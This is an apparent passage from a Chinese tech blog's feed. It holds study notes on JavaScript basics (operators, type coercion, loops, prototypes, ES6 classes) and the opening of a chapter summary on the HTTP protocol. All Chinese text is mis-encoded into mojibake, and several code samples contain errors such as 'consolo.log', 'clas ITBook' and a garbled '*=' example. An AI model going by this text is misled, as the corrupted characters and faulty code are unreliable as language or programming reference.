anywhereï¼Œä¹Ÿå¯ä»¥è¾¾åˆ°åŒæ ·çš„ç›®çš„ã€‚ 1cnpm i anywhere -g è¿™æ ·ï¼Œæ•´ä¸ªçŽ¯å¢ƒå°±æ­å»ºå¥½äº†ã€‚ JavaScriptåŸºç¡€å˜é‡å˜é‡èƒ½ä¿å­˜çš„æ•°æ®å¯ä»¥åœ¨éœ€è¦æ—¶è®¾ç½®ã€æ›´æ–°å’Œæ‘„å–ã€‚èµ‹ç»™å˜é‡çš„å€¼éƒ½æœ‰å¯¹åº”çš„ç±»åž‹ã€‚ JavaScriptçš„ç±»åž‹æœ‰æ•°å­—ã€å­—ç¬¦ä¸²ã€å¸ƒå°”å€¼ã€å‡½æ•°å’Œå¯¹è±¡ã€‚è¿˜æœ‰ undefined å’Œ nullï¼Œä»¥åŠæ•°ç»„ã€æ—¥æœŸå’Œæ­£åˆ™è¡¨è¾¾å¼ã€‚ æ³¨æ„ï¼šJavaScriptä¸æ˜¯å¼ºè¯­è¨€ç±»åž‹ï¼Œè·ŸåŽé¢æˆ‘è¦å­¦çš„TypeScriptä¸ä¸€æ ·ï¼Œè¿™æ„å‘³ç€å£°æ˜Žå˜é‡çš„æ—¶å€™ä¸ç”¨æŒ‡å®šå˜é‡çš„ç±»åž‹ è°ƒè¯•è¾“å‡ºå˜é‡å€¼çš„æ—¶å€™æœ‰ä¸‰ç§ç®€å•çš„æ–¹æ³• æ–¹æ³• æè¿° alert(â€œxâ€) å°†è¾“å‡ºåˆ°æµè§ˆå™¨çš„è­¦ç¤ºçª—å£ console.log(â€œxâ€) æŠŠæ–‡æœ¬è¾“å‡ºåˆ°è°ƒè¯•å·¥å…·çš„Consoleæ ‡ç­¾ document.write(â€œxâ€) ç›´æŽ¥è¾“å‡ºåˆ°HTMLé¡µé¢é‡Œå¹¶è¢«æµè§ˆå™¨å‘ˆçŽ° å˜é‡ä½œç”¨åŸŸä½œç”¨åŸŸæŒ‡åœ¨ç¼–å†™çš„ç®—æ³•å‡½æ•°æ—¶ï¼Œæˆ‘ä»¬èƒ½å¤Ÿè®¿é—®çš„å˜é‡ï¼ˆåœ¨ä½¿ç”¨æ—¶ï¼Œå‡½æ•°ä½œç”¨åŸŸä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªå‡½æ•°ï¼‰ã€‚æœ‰å±€éƒ¨å˜é‡å’Œå…¨å±€å˜é‡ä¸¤ç§ã€‚ æ“ä½œç¬¦åœ¨JavaScripté‡Œæœ‰ç®—æ•°æ“ä½œç¬¦ã€èµ‹å€¼æ“ä½œç¬¦ã€æ¯”è¾ƒæ“ä½œç¬¦ã€é€»è¾‘æ“ä½œç¬¦ã€ä½æ“ä½œç¬¦ã€ä¸€å…ƒæ“ä½œç¬¦å’Œå…¶ä»–æ“ä½œç¬¦ã€‚ ç®—æ•°æ“ä½œç¬¦ ç®—æ•°æ“ä½œç¬¦ æè¿° + åŠ æ³• - å‡æ³• * ä¹˜æ³• / é™¤æ³• % å–ä½™ ++ é€’å¢ž - - é€’å‡ èµ‹å€¼æ“ä½œç¬¦ èµ‹å€¼æ“ä½œç¬¦ æè¿° = èµ‹å€¼ += ï¼ˆx += yï¼‰ == ( x = x + y ) -= ï¼ˆx -= yï¼‰ == ( x = x - y ) *= ï¼ˆx = yï¼‰ == ( x = x \ y ) /= ï¼ˆx /= yï¼‰ == ( x = x / y ) %= ï¼ˆx %= yï¼‰ == ( x = x % y ) æ¯”è¾ƒæ“ä½œç¬¦ æ¯”è¾ƒæ“ä½œç¬¦ æè¿° == ç›¸ç­‰ === å…¨ç­‰ != ä¸ç­‰ &gt; å¤§äºŽ >= å¤§äºŽç­‰äºŽ &lt; å°äºŽ &lt;= å°äºŽç­‰äºŽ é€»è¾‘æ“ä½œç¬¦ é€»è¾‘æ“ä½œç¬¦ æè¿° &amp;&amp; ä¸Ž åŒç«–çº¿ æˆ– ï¼ éž ä½æ“ä½œç¬¦ ä½æ“ä½œç¬¦ æè¿° &amp; ä¸Ž å•ç«–çº¿ æˆ– ~ éž ^ å¼‚æˆ– &lt;&lt; å·¦ç§» >&gt; å³ç§» typeofæ“ä½œç¬¦å¯ä»¥è¿”å›žå˜é‡æˆ–è€…è¡¨è¾¾å¼çš„ç±»åž‹ã€‚ 12345console.log(typeof num); // numberconsole.log(typeof "num"); // stringconsole.log(typeof true); // booleanconsole.log(typeof [1,2,3]); //objectconsole.log(typeof &#123;num:"2"&#125;); // object çœŸå€¼å’Œå‡å€¼trueå’Œ falseåœ¨ javascript ä¸­çš„è½¬æ¢å¦‚ä¸‹è¡¨ æ•°å€¼ç±»åž‹ è½¬æ¢æˆå¸ƒå°”å€¼ undefined false null false å¸ƒå°”å€¼ trueæˆ–è€…false æ•°å­— +0/-0/NaNéƒ½æ˜¯falseå…¶ä»–æ˜¯true å­—ç¬¦ä¸² å¦‚æžœå­—ç¬¦ä¸²æ˜¯ç©ºï¼ˆé•¿åº¦æ˜¯0ï¼‰ä¸ºfalse,å…¶ä»–ä¸ºtrue å¯¹è±¡ true ç›¸ç­‰æ“ä½œç¬¦ ç±»åž‹ï¼ˆxï¼‰ ç±»åž‹ï¼ˆyï¼‰ ç»“æžœ null undefined true undefined null true æ•°å­— å­—ç¬¦ä¸² x == toNumber(y) å­—ç¬¦ä¸² æ•°å­— toNumber(x) == y å¸ƒå°”å€¼ ä»»ä½•ç±»åž‹ toNumber(x) == y ä»»ä½•ç±»åž‹ å¸ƒå°”å€¼ x == toNumber(y) å­—ç¬¦ä¸²æˆ–æ•°å­— å¯¹è±¡ x == toPrimitive(y) å¯¹è±¡ å­—ç¬¦ä¸²æˆ–æ•°å­— toPrimitive(x) == y å¦‚æžœxå’Œyæ˜¯ç›¸åŒç±»åž‹ï¼ŒjavaScriptä¼šæ¯”è¾ƒå®ƒä»¬çš„å€¼æˆ–è€…æ˜¯å¯¹è±¡å€¼ã€‚å…¶ä»–æ²¡æœ‰åœ¨ä¸Šè¿°è¡¨æ ¼ä¸­çš„æƒ…å†µéƒ½ä¼šè¿”å›žfalseã€‚ toNumberå’Œ toPrimitiveæ–¹æ³•éƒ½æ˜¯å†…éƒ¨çš„ï¼Œå¹¶æ ¹æ®ä»¥ä¸‹è¡¨æ ¼å¯¹å…¶è¿›è¡Œä¼°å€¼ toNumberæ–¹æ³•å¯¹ä¸åŒç±»åž‹è¿”å›žçš„ç»“æžœå¦‚ä¸‹è¡¨ å€¼ç±»åž‹ ç»“æžœ undefined NaN null +0 å¸ƒå°”å€¼ true=&gt;1æˆ–è€…false=&gt;+0 æ•°å­— æ•°å­—å¯¹åº”çš„å€¼ å­—ç¬¦ä¸² å°†å­—ç¬¦ä¸²è§£æžæˆæ•°å­—ã€‚å¦‚æžœå­—ç¬¦ä¸²ä¸­åŒ…å«å­—æ¯ï¼Œå°±è¿”å›žNaN,å¦‚æžœæ˜¯ç”±æ•°å­—å­—ç¬¦ç»„æˆçš„ï¼Œå°±è½¬æ¢æˆæ•°å­— å¯¹è±¡ Number(toPrimitive(value)) toPrimitiveæ–¹æ³•å¯¹ä¸åŒç±»åž‹è¿”å›žçš„ç»“æžœå¦‚ä¸‹ï¼š å€¼ç±»åž‹ ç»“æžœ å¯¹è±¡ å¦‚æžœå¯¹è±¡çš„valueOfæ–¹æ³•çš„ç»“æžœæ˜¯åŽŸå§‹å€¼ï¼Œè¿”å›žåŽŸå§‹å€¼ã€‚å¦‚æžœå¯¹è±¡çš„toStringæ–¹æ³•è¿”å›žåŽŸå§‹å€¼ï¼Œå°±è¿”å›žè¿™ä¸ªå€¼ï¼Œå…¶ä»–æƒ…å†µéƒ½è¿”å›žä¸€ä¸ªæ“ä½œã€‚ 123"x" ? true : false // true"x"(NaN) == true(1) // false"x"(NaN) == false(+0) // false é‚£ä¹ˆ ===æ“ä½œç¬¦å‘¢ï¼Ÿ ç›¸æ¯”è¾ƒèµ·æ¥å°±ç®€å•å¾ˆå¤šï¼Œå¦‚æžœæ¯”è¾ƒçš„ä¸¤ä¸ªå€¼ç±»åž‹ä¸åŒï¼Œæ¯”è¾ƒçš„ç»“æžœå°±æ˜¯ false,å¦‚æžœç±»åž‹ç›¸åŒï¼Œå°±ä¼šæ ¹æ®ä¸‹é¢çš„è¡¨æ ¼è¿›è¡Œåˆ¤æ–­ã€‚ ç±»åž‹ï¼ˆxï¼‰ å€¼ ç»“æžœ æ•°å­— xå’Œyæ•°å€¼ç›¸åŒï¼ˆä½†ä¸æ˜¯NaNï¼‰ true å­—ç¬¦ä¸² xå’Œyæ˜¯ç›¸åŒçš„å­—ç¬¦ true å¸ƒå°”å€¼ xå’ŒyåŒæ˜¯falseæˆ–è€…true true å¯¹è±¡ xå’Œyå¼•ç”¨åŒä¸ªå¯¹è±¡ true 12345"x" === true // false"x" === "x" // truevar person1 = &#123; name: 'John' &#125;var person2 = &#123; name: 'John' &#125;person1 === person2 // false ä¸åŒçš„å¯¹è±¡ æŽ§åˆ¶ç»“æž„æ¡ä»¶è¯­å¥æ”¯æŒ if...elseå’Œ switchã€‚å¾ªçŽ¯æ”¯æŒ whileã€do...whileå’Œ forã€‚ æ¡ä»¶è¯­å¥å®žä¾‹ï¼šåˆ¤æ–­month 123456789101112131415161718192021222324252627281. if...elseif(month === 1)&#123; console.log('January');&#125;else if(month === 2)&#123; console.log('February');&#125;...else&#123; ...&#125;2. switchswitch(month)&#123; case 1: console.log('January'); break; case 2: console.log('February'); break; ... default: consolo.log(...)&#125;3. &amp;&amp; ä¸Ž || è¿ç®—ç¬¦(month == 1 &amp;&amp; console.log('January')) || (month == 2 &amp;&amp; console.log('February')) || ...4. ä¸‰å…ƒè¿ç®—ç¬¦month == 1 ? console.log('January') : month == 2 ? console.log('February') : ... å¾ªçŽ¯å¤„ç†æ•°ç»„å…ƒç´ çš„æ—¶å€™ç»å¸¸ä¼šç”¨åˆ°å¾ªçŽ¯ã€‚ å®žä¾‹ï¼šè¾“å‡º0åˆ°9 1234567891011121314151617181. forfor(var i = 0;i &lt; 10;i++)&#123; console.log(i);&#125;2.whilevar i = 0;while(i&lt;10)&#123; console.log(i); i++&#125;3.do ... whilevar i = 0;do&#123; console.log(i); i++:&#125; while(i&lt;10) å‡½æ•°å‡½æ•°åœ¨JavsScriptä¸­æ˜¯å¾ˆé‡è¦çš„ã€‚åˆ†ä¸ºç”¨ä¼ å‚æ•°ã€returnæˆ–è€…æ˜¯ç›´æŽ¥è°ƒç”¨ã€‚ JavaScripté¢å‘å¯¹è±¡ç¼–ç¨‹JavaScripté‡Œçš„å¯¹è±¡å°±æ˜¯æ™®é€šåå€¼å¯¹çš„é›†åˆã€‚åˆ›å»ºä¸€ä¸ªæ™®é€šå¯¹è±¡æœ‰ä¸¤ç§æ–¹å¼ã€‚ 1234567891011// ç¬¬ä¸€ç§æ–¹å¼:var obj = new Object();// ç¬¬äºŒç§æ–¹å¼obj = &#123; name:&#123; first:"èµ–", lastï¼š"xx" &#125;, address: "jj"&#125; å¯ä»¥çœ‹å‡ºï¼Œå£°æ˜ŽJavaScriptå¯¹è±¡çš„æ—¶å€™ï¼Œé”®å€¼å¯¹ä¸­çš„é”®å°±æ˜¯å¯¹è±¡çš„å±žæ€§ï¼Œå€¼å°±æ˜¯å¯¹åº”å±žæ€§çš„å€¼ã€‚ åœ¨é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼ˆOOPï¼‰ä¸­ï¼Œå¯¹è±¡æ˜¯ç±»çš„å®žä¾‹ã€‚ä¸€ä¸ªç±»å®šä¹‰äº†å¯¹è±¡çš„ç‰¹å¾ã€‚æˆ‘ä»¬ä¼šåˆ›å»ºå¾ˆå¤šç±»æ¥è¡¨ç¤ºç®—æ³•å’Œæ•°æ®ç»“æž„ã€‚ 1234567891011121314151617181920212223242526272829// å£°æ˜Žä¸€ä¸ªç±»æ¥è¡¨ç¤ºä¹¦function Book(title, pages, isbn)&#123; this.title = title; this.pages = pages; this.isbn = isbn;&#125;// å®žä¾‹åŒ–è¿™ä¸ªç±»var book = new Book('title', 'pages', 'isbn' );//å¯ä»¥ä¿®æ”¹æˆ–è€…æ˜¯è®¿é—®å¯¹è±¡çš„å±žæ€§book.title // ä¹¦åbook.title = "new title"; //ä¿®æ”¹ä¹¦å// ç±»å¯ä»¥åŒ…å«å‡½æ•°ï¼Œå¯ä»¥å£°æ˜Žå’Œä½¿ç”¨å‡½æ•°Book.prototype.printTitle = function()&#123; console.log(this.title);&#125;book.printTitle();// ä¹Ÿå¯ä»¥ç›´æŽ¥åœ¨ç±»çš„å®šä¹‰é‡Œå£°æ˜Žå‡½æ•°function Book(title, pages, isbn)&#123; this.title = title; this.pages = pages; this.isbn = isbn; this.printIsbn = function() &#123; console.log(this.isbn); &#125;&#125; book.printIsbn(); æ³¨æ„ï¼šåœ¨åŽŸåž‹çš„ä¾‹å­é‡Œï¼Œ printTitleå‡½æ•°åªä¼šåˆ›å»ºä¸€æ¬¡ï¼Œåœ¨æ‰€æœ‰å®žä¾‹ä¸­å…±äº«ã€‚å¦‚æžœåœ¨ç±»çš„å®šä¹‰é‡Œå£°æ˜Žï¼Œåˆ™æ¯ä¸ªå®žä¾‹éƒ½ä¼šåˆ›å»ºè‡ªå·±çš„å‡½æ•°å‰¯æœ¬ã€‚ä½¿ç”¨åŽŸåž‹æ–¹æ³•å¯ä»¥èŠ‚çº¦å†…å­˜å’Œé™ä½Žå®žä¾‹åŒ–çš„å¼€é”€ã€‚ä¸è¿‡åŽŸåž‹æ–¹æ³•åªèƒ½å£°æ˜Žå…¬å…±å‡½æ•°å’Œå±žæ€§ï¼Œè€Œç±»å®šä¹‰å¯ä»¥å£°æ˜Žåªåœ¨ç±»å†…éƒ¨è®¿é—®çš„ç§æœ‰å‡½æ•°å’Œå±žæ€§ã€‚ è°ƒè¯•å·¥å…·Firefox å’Œ Chrome éƒ½æ”¯æŒè°ƒè¯•ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªäº†è§£ è°·æ­Œå¼€å‘è€…å·¥å…·çš„å¥½æ•™ç¨‹,å¯ä»¥è‡ªå·±äº†è§£ä¸€ä¸‹ã€‚ ECMAScriptæ¦‚è¿°ECMAScriptæ˜¯ä¸€ç§è¯­è¨€çš„è§„èŒƒï¼Œå…·ä½“æƒ³çŸ¥é“çš„å¯ä»¥ ç‚¹å‡»è¿™é‡Œ ECMAScript6çš„åŠŸèƒ½å› ä¸ºåœ¨åˆ«çš„åœ°æ–¹æœ‰åšäº†æ›´è¯¦ç»†çš„ç¬”è®°ï¼Œåœ¨è¿™é‡Œå°±ä¸ç´¯è¿°ï¼Œè¯¦æƒ…ç‚¹å‡»ä¸‹é¢ã€‚ ç‚¹æˆ‘ è¡¥å……ï¼šä½¿ç”¨ç±»è¿›è¡Œé¢å‘å¯¹è±¡ç¼–ç¨‹1234567891011121314151617181920function Book(title, pages, isbn)&#123; this.title = title; this.pages = pages; this.isbn = isbn;&#125;Book.prototype.printTitle = function() &#123; console.log(this.title);&#125;ES6:class Book &#123; constructor(title, pages, isbn)&#123; this.title = title; this.pages = pages; this.isbn = isbn; &#125; printTitle()&#123; console.log(this.title); &#125;&#125; ç»§æ‰¿ é™¤äº†æ–°çš„å£°æ˜Žç±»çš„æ–¹å¼ï¼Œç±»çš„ç»§æ‰¿ä¹Ÿæœ‰ç®€åŒ–çš„è¯­æ³•ã€‚ 123456789clas ITBook extends Book &#123; constructor(title, pages, isbn, technology)&#123; super(title, pages, isbn); this.technology = technology; &#125; printTitle()&#123; console.log(this.title); &#125;&#125; æˆ‘ä»¬å¯ä»¥ç”¨ extendså…³é”®å­—æ‰©å±•ä¸€ä¸ªç±»å¹¶ç»§æ‰¿å®ƒçš„è¡Œä¸ºï¼Œåœ¨æž„é€ å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ superå…³é”®å­—å¼•ç”¨çˆ¶ç±»çš„æž„é€ å‡½æ•°ã€‚ å°ç»“æœ¬ç« ä¸»è¦è®²äº†å¦‚ä½•æ­å»ºç®€å•çš„å¼€å‘çŽ¯å¢ƒï¼Œä¹Ÿç¨å¾®åœ°æŠŠjavaScriptåŸºç¡€çŸ¥è¯†ã€å’ŒECMAScript6è¿‡äº†ä¸€éï¼Œä¸ºæŽ¥ä¸‹æ¥çš„æ•°æ®ç»“æž„â€”â€”æ•°ç»„åšé“ºåž«ã€‚ ä¹¦ç±é“¾æŽ¥ï¼š å­¦ä¹ JavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•]]></content>
      <categories>
        <category>javaScriptç›¸å…³</category>
      </categories>
      <tags>
        <tag>javaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥æµ…å‡ºHTTPï¼Œä»Žå¼€å§‹åˆ°æ”¾å¼ƒï¼ˆç¬¬äºŒç« ï¼‰â€”â€” ç®€å•çš„ HTTP åè®®]]></title>
    <url>%2F2018-08-10-read-%E5%9B%BE%E8%A7%A3HTTP-Part2.html</url>
    <content type="text"><![CDATA[ç¬¬äºŒç«  ç®€å•çš„ HTTP åè®®HTTPåè®®ç”¨äºŽå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯ä¹‹é—´çš„é€šä¿¡HTTP åè®®å’Œ TCP/IP åè®®æ—å†…çš„å…¶ä»–ä¼—å¤šçš„åè®®ç›¸åŒï¼Œç”¨äºŽå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ã€‚è¯·æ±‚è®¿é—®æ–‡æœ¬æˆ–å›¾åƒç­‰èµ„æºçš„ä¸€ç«¯ç§°ä¸ºå®¢æˆ·ç«¯ï¼Œè€Œæä¾›èµ„æºå“åº”çš„ä¸€ç«¯ç§°ä¸ºæœåŠ¡å™¨ç«¯ã€‚ åº”ç”¨HTTPåè®®æ—¶ï¼Œå¿…å®šæ˜¯ä¸€ç«¯æ‹…ä»»å®¢æˆ·ç«¯è§’è‰²ï¼Œå¦ä¸€ç«¯æ‹…ä»»æœåŠ¡å™¨ç«¯è§’è‰²ã€‚æœ‰æ—¶å€™ï¼ŒæŒ‰å®žé™…æƒ…å†µï¼Œä¸¤å°è®¡ç®—æœºä½œä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯çš„è§’è‰²æœ‰å¯èƒ½ä¼šäº’æ¢ï¼Œä½†å°±ä»…ä»Žä¸€æ¡é€šä¿¡çº¿è·¯æ¥è¯´ï¼ŒæœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯çš„è§’è‰²æ˜¯ç¡®å®šçš„ï¼Œè€Œç”¨HTTPåè®®èƒ½å¤Ÿæ˜Žç¡®åŒºåˆ†å“ªç«¯æ˜¯å®¢æˆ·ç«¯ï¼Œå“ªç«¯æ˜¯æœåŠ¡å™¨ç«¯ã€‚ é€šè¿‡è¯·æ±‚å’Œå“åº”çš„äº¤æ¢è¾¾æˆé€šä¿¡è¯·æ±‚å¿…å®šç”±å®¢æˆ·ç«¯å‘é€ï¼Œè€ŒæœåŠ¡å™¨ç«¯å›žå¤å“åº” HTTPåè®®è§„å®šï¼Œè¯·æ±‚ä»Žå®¢æˆ·ç«¯å‘å‡ºï¼Œæœ€åŽæœåŠ¡å™¨ç«¯å“åº”è¯¥è¯·æ±‚å¹¶è¿”å›žã€‚æ¢å¥è¯è¯´ï¼Œè‚¯å®šæ˜¯å…ˆä»Žå®¢æˆ·ç«¯å¼€å§‹å»ºç«‹é€šä¿¡çš„ï¼ŒæœåŠ¡å™¨ç«¯åœ¨æ²¡æœ‰æŽ¥å—åˆ°è¯·æ±‚ä¹‹å‰ä¸ä¼šå‘é€å“åº”ã€‚ ä¸‹é¢åˆ™æ˜¯ä»Žå®¢æˆ·ç«¯å‘é€æŸä¸ªHTTPæœåŠ¡å™¨ç«¯çš„è¯·æ±‚æŠ¥æ–‡ä¸­çš„å†…å®¹ 12GET/index.htm HTTP/1.1HOST: hackr.jp èµ·å§‹è¡Œå¼€å¤´çš„GETè¡¨ç¤ºè¯·æ±‚è®¿é—®æœåŠ¡å™¨çš„ç±»åž‹ï¼Œç§°ä¸ºæ–¹æ³•ï¼ˆmethodï¼‰ã€‚éšåŽçš„å­—ç¬¦ä¸²/index.htmæŒ‡æ˜Žäº†è¯·æ±‚è®¿é—®çš„èµ„æºå¯¹è±¡ï¼Œä¹Ÿå«åšè¯·æ±‚URI(request-URI)ã€‚æœ€åŽçš„HTTP/1.1ï¼Œå³HTTPçš„ç‰ˆæœ¬å·ï¼Œç”¨æ¥æç¤ºå®¢æˆ·ç«¯ä½¿ç”¨çš„HTTPåè®®åŠŸèƒ½ã€‚ ç»¼åˆæ¥çœ‹ï¼Œè¿™æ®µè¯·æ±‚å†…å®¹çš„æ„æ€æ˜¯ï¼šè¯·æ±‚è®¿é—®æŸå°HTTPæœåŠ¡å™¨ä¸Šçš„ /index.htmé¡µé¢èµ„æºã€‚ è¯·æ±‚æŠ¥æ–‡æ˜¯ç”±è¯·æ±‚æ–¹æ³•ã€è¯·æ±‚URLã€åè®®ç‰ˆæœ¬ã€å¯é€‰çš„è¯·æ±‚é¦–éƒ¨å­—æ®µå’Œå†…å®¹å®žä½“æž„æˆçš„ã€‚ å›¾ï¼šè¯·æ±‚æŠ¥æ–‡çš„æž„æˆ è¯·æ±‚é¦–éƒ¨å­—æ®µåŠå†…å®¹å®žä½“åŽé¢ä¼šä½œè¯¦ç»†è¯´æ˜Žã€‚æŽ¥å—åˆ°è¯·æ±‚çš„æœåŠ¡å™¨ï¼Œä¼šå°†è¯·æ±‚å†…å®¹çš„å¤„ç†ç»“æžœä»¥å“åº”çš„å½¢å¼è¿”å›ž 123456HTTP/1.1 200 OKDate: Tue, 10 Jul 2012 06:50:15 GMTContent-Length: 362Content-Type: text/html... åœ¨èµ·å§‹è¡Œå¼€å¤´çš„HTTP/1.1è¡¨ç¤ºæœåŠ¡å™¨å¯¹åº”çš„HTTPç‰ˆæœ¬ã€‚ ç´§æŒ¨ç€çš„200 OKè¡¨ç¤ºè¯·æ±‚çš„å¤„ç†ç»“æžœçš„çŠ¶æ€ç ï¼ˆstatus codeï¼‰å’ŒåŽŸå› çŸ­è¯­ï¼ˆreason-phraseï¼‰ã€‚ä¸‹ä¸€è¡Œæ˜¾ç¤ºäº†åˆ›å»ºå“åº”çš„æ—¥æœŸæ—¶é—´ï¼Œæ˜¯é¦–éƒ¨å­—æ®µï¼ˆheader fieldï¼‰å†…çš„ä¸€ä¸ªå±žæ€§ã€‚æŽ¥ç€ä»¥ä¸€ç©ºè¡Œåˆ†éš”ï¼Œä¹‹åŽçš„å†…å®¹ç§°ä¸ºèµ„æºå®žä½“çš„ä¸»ä½“ï¼ˆentity bodyï¼‰ã€‚ å“åº”æŠ¥æ–‡åŸºæœ¬ä¸Šç”±åè®®ç‰ˆæœ¬ã€çŠ¶æ€ç ï¼ˆè¡¨ç¤ºè¯·æ±‚æˆåŠŸæˆ–å¤±è´¥çš„æ•°å­—ä»£ç ï¼‰ã€ç”¨ä»¥è§£é‡ŠçŠ¶æ€ç çš„åŽŸå› çŸ­è¯­ã€å¯é€‰çš„å“åº”é¦–éƒ¨å­—æ®µä»¥åŠå®žä½“ä¸»ä½“æž„æˆã€‚ å›¾ï¼šå“åº”æŠ¥æ–‡çš„æž„æˆ HTTPæ˜¯ä¸ä¿å­˜çŠ¶æ€çš„åè®®HTTPæ˜¯ä¸€ç§ä¸ä¿å­˜çŠ¶æ€ï¼Œå³æ— çŠ¶æ€ï¼ˆstatelessï¼‰åè®®ã€‚HTTPåè®®è‡ªèº«ä¸å¯¹è¯·æ±‚å’Œå“åº”ä¹‹é—´çš„é€šä¿¡çŠ¶æ€è¿›è¡Œä¿å­˜ã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨HTTPè¿™ä¸ªçº§åˆ«ï¼Œåè®®å¯¹äºŽå‘é€çš„è¯·æ±‚æˆ–å“åº”éƒ½ä¸åšæŒä¹…åŒ–å¤„ç† ä½¿ç”¨HTTPåè®®ï¼Œæ¯å½“æœ‰æ–°çš„è¯·æ±‚å‘é€æ—¶ï¼Œå°±ä¼šæœ‰å¯¹åº”çš„æ–°å“åº”äº§ç”Ÿã€‚åè®®æœ¬èº«å¹¶ä¸ä¿ç•™ä¹‹å‰çš„ä¸€åˆ‡çš„è¯·æ±‚æˆ–å“åº”æŠ¥æ–‡çš„ä¿¡æ¯ã€‚è¿™æ˜¯ä¸ºäº†æ›´å¿«åœ°å¤„ç†å¤§é‡äº‹åŠ¡ï¼Œç¡®ä¿åè®®çš„å¯ä¼¸ç¼©æ€§ï¼Œè€Œç‰¹æ„æŠŠHTTPåè®®è®¾è®¡æˆå¦‚æ­¤ç®€å•çš„ã€‚å¯æ˜¯ï¼Œéšç€Webçš„ä¸æ–­å‘å±•ï¼Œå› æ— çŠ¶æ€è€Œå¯¼è‡´ä¸šåŠ¡å¤„ç†å˜å¾—æ£˜æ‰‹çš„æƒ…å†µå¢žå¤šäº†ã€‚æ¯”å¦‚ï¼Œç”¨æˆ·ç™»å½•åˆ°ä¸€å®¶è´­ç‰©ç½‘ç«™ï¼Œå³ä½¿ä»–è·³è½¬åˆ°è¯¥ç«™çš„å…¶ä»–é¡µé¢åŽï¼Œä¹Ÿéœ€è¦èƒ½ç»§ç»­ä¿æŒç™»å½•çŠ¶æ€ã€‚é’ˆå¯¹è¿™ä¸ªå®žä¾‹ï¼Œç½‘ç«™ä¸ºäº†èƒ½å¤ŸæŽŒæ¡æ˜¯è°é€å‡ºçš„è¯·æ±‚ï¼Œéœ€è¦ä¿å­˜ç”¨æˆ·çš„çŠ¶æ€ã€‚ HTTP/1.1 è™½ç„¶æ˜¯æ— çŠ¶æ€åè®®ï¼Œä½†ä¸ºäº†å®žçŽ°æœŸæœ›çš„ä¿æŒçŠ¶æ€åŠŸèƒ½ï¼ŒäºŽæ˜¯å¼•å…¥äº†CookieæŠ€æœ¯ã€‚æœ‰äº†Cookieå†ç”¨HTTPåè®®é€šä¿¡ï¼Œå°±å¯ä»¥ç®¡ç†çŠ¶æ€äº†ã€‚ è¯·æ±‚ URI å®šä½èµ„æºHTTPåè®®ä½¿ç”¨URIå®šä½äº’è”ç½‘ä¸Šçš„èµ„æºã€‚æ­£æ˜¯å› ä¸ºURIçš„ç‰¹å®šåŠŸèƒ½ï¼Œåœ¨äº’åˆ©ç½‘ä¸Šä»»æ„ä½ç½®çš„èµ„æºéƒ½èƒ½è®¿é—®åˆ°ã€‚ å½“å®¢æˆ·ç«¯è¯·æ±‚åœ¨è®¿é—®èµ„æºè€Œå‘é€è¯·æ±‚æ—¶ï¼ŒURIéœ€è¦å°†ä½œä¸ºè¯·æ±‚æŠ¥æ–‡ä¸­è¯·æ±‚URIåŒ…å«åœ¨å†…ã€‚æŒ‡å®šè¯·æ±‚URIçš„æ–¹å¼æœ‰å¾ˆå¤šã€‚ 123456URIä¸ºå®Œæ•´çš„è¯·æ±‚URIGET http://laibh.top/2018/08/09/2018-08-09-read-å›¾è§£HTTP-Part2 åœ¨é¦–éƒ¨å­—æ®µHostä¸­å†™æ˜Žç½‘ç»œåŸŸåæˆ–IPåœ°å€GET /2018/08/09/2018-08-09-read-å›¾è§£HTTP-Part2 HTTP/1.1Host: laibh.top é™¤æ­¤ä¹‹å¤–ï¼Œå¦‚æžœä¸æ˜¯è®¿é—®ç‰¹å®šèµ„æºè€Œæ˜¯å¯¹æœåŠ¡å™¨æœ¬èº«å‘èµ·è¯·æ±‚ï¼Œå¯ä»¥ç”¨ä¸€ä¸ª*æ¥æ›¿ä»£è¯·æ±‚URIã€‚ä¸‹é¢è¿™ä¸ªä¾‹å­å°±æ˜¯æŸ¥è¯¢HTTPæœåŠ¡ç«¯æ”¯æŒçš„HTTPçš„æ–¹æ³•ç§ç±» 1OPTIONS * HTTP/1.1 å‘ŠçŸ¥æœåŠ¡å™¨æ„å›¾çš„ HTTP æ–¹æ³•HTTP/1.1ä¸­å¯ä»¥ä½¿ç”¨çš„æ–¹æ³• GET: èŽ·å–èµ„æºGETæ–¹æ³•ç”¨æ¥è¯·æ±‚è®¿é—®å·²è¢«URIè¯†åˆ«çš„èµ„æºã€‚æŒ‡å®šçš„èµ„æºæœåŠ¡å™¨ç«¯è§£æžåŽè¿”å›žå“åº”å†…å®¹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æžœè¯·æ±‚çš„èµ„æºæ—¶æ–‡æœ¬ï¼Œé‚£å°±ä¿æŒåŽŸæ ·è¿”å›žï¼›å¦‚æžœæ˜¯åƒCGIï¼ˆCommon Gateway Interface,é€šç”¨ç½‘å…³æŽ¥å£ï¼‰é‚£æ ·çš„ç¨‹åºï¼Œåˆ™è¿”å›žç»è¿‡æ‰§è¡ŒåŽçš„è¾“å‡ºç»“æžœ ä½¿ç”¨GETæ–¹æ³•çš„è¯·æ±‚å“åº”çš„ä¾‹å­ çŠ¶æ€ æè¿° è¯·æ±‚ GET /index.html HTTP/1.1Host: www.hackr.jp å“åº” è¿”å›ž index.html çš„é¡µé¢èµ„æº çŠ¶æ€ æè¿° è¯·æ±‚ GET /index.html HTTP/1.1Host: www.hackr.jpIf-Modified-Since: Thu,12 Jul 2012 07:30:00 GMT å“åº” ä»…è¿”å›ž2017å¹´7æœˆ12å·7ç‚¹30åˆ†ä»¥åŽæ›´æ–°è¿‡çš„index.htmlé¡µé¢èµ„æºã€‚å¦‚æžœæœªæœ‰å†…å®¹æ›´æ–°ï¼Œåˆ™ä»¥çŠ¶æ€ç 304 Not Modified ä½œä¸ºå“åº”è¿”å›ž POST: ä¼ 